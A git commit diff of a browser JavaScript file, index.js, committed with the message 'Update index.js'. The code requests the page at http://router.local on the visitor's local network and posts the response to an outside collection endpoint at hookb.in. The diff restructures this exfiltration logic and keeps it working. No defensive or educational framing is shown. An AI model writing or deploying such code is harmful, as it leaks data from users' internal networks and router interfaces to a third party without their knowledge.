f6d22619d809d25f7efaa0c72af952da47ffbf14
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-04 09:30:24 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,20 @@
 const http = new XMLHttpRequest();
-http.addEventListener('load', function (event) {
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
-    xhr.setRequestHeader('Content-type', 'application/json');
-    xhr.send(JSON.stringify(http.responseText));
-});
-http.open('GET', 'router.local');
+http.open('GET', 'http://router.local',true);
+// http.addEventListener('load', function (event) {
+//     const xhr = new XMLHttpRequest();
+//     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
+//     xhr.setRequestHeader('Content-type', 'application/json');
+//     xhr.send(JSON.stringify(http.responseText));
+// });
+http.onload = function () {
+    if (http.readyState === http.DONE) {
+        if (http.status === 200) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
+            xhr.setRequestHeader('Content-type', 'application/json');
+            xhr.send(JSON.stringify(http.responseText));
+        }
+    }
+};
+//http.open('GET', 'http://router.local');
 http.send();
